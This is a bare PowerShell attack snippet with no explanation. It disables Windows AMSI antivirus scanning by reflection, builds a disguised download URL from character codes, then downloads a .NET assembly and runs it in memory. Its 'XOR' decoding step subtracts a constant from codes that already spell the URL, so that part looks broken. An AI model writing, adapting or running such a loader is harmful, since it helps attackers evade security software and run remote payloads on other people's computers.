# AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# XOR URL
$xor=77;$u=[char[]](104,116,116,112,115,58,47,47,117,46,116,111,47,90,72,90,51,73,103)|%{[char]($_-$xor)};$url=-join $u

# Download + Memory Load
$wc=New-Object Net.WebClient;$b=$wc.DownloadData($url);$asm=[Reflection.Assembly]::Load($b);$t=$asm.EntryPoint.DeclaringType;$asm.EntryPoint.Invoke($null,@())
